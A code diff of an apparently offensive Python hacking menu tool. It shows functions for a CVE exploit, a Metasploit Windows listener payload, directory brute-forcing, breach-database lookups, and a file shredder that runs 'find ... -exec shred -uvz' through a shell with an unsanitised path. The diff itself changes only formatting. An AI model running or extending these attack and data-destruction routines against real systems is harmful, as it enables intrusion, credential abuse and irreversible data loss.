@@ -1,14 +1,15 @@
 import getpass
 import os
 import subprocess
+
 import requests
 from email_validator import validate_email, EmailNotValidError
-
 from pymenu import Menu
 from pymetasploit3.msfrpc import MsfRpcClient
 
 nightmarekey = ''
 breachdirectorykey = ''
+
 
 def CVE20262461():
     selector = input('[+] Single or multiple: ')
@@ -66,6 +67,7 @@ def windowslistener():
     winpayload['LPORT'] = PORT
     exploit.execute(payload=winpayload)
 
+
 def nightmare():
     target = input('[+] Target URL/IP Address: ')
     port = input('[+] Target Port: ')
@@ -80,7 +82,6 @@ def nightmare():
         print('[+] Success: ' + data['message'])
 
 
-
 def dirbrute():
     target = input('[+] Target URL/IP Address: ')
     wordlist = input('[+] Wordlist: ')
@@ -93,6 +94,7 @@ def dirbrute():
             else:
                 print('[+] Error HTTP code: ' + str(response.status_code))
 
+
 def breachdirectory():
     email = input('[+] Email Address or username: ')
     try:
@@ -101,10 +103,7 @@ def breachdirectory():
             print(f'\n[+] Checking BreachDirectory...')
             url = 'https://breachdirectory.p.rapidapi.com/'
             querystring = {'func': 'auto', 'term': f'{validated_email}'}
-            headers = {
-                'x-rapidapi-key': breachdirectorykey,
-                'x-rapidapi-host': 'breachdirectory.p.rapidapi.com'
-            }
+            headers = {'x-rapidapi-key': breachdirectorykey, 'x-rapidapi-host': 'breachdirectory.p.rapidapi.com'}
             response = requests.get(url, headers=headers, params=querystring)
             data = response.json()
             if data['found'] == 0:
@@ -118,6 +117,7 @@ def breachdirectory():
     except EmailNotValidError as e:
         print(str(e))
 
+
 def shredder():
     choice = input('[+] File (1) or Directory (2): ')
     if choice == '1':
@@ -128,6 +128,7 @@ def shredder():
         directory = input('[+] Directory path: ')
         print(f'[+] Shredding {directory}')
         subprocess.run(f'find {directory} -type f -exec shred -uvz' + ''' {} \;''', shell=True)
+
 
 menu = Menu('''
 
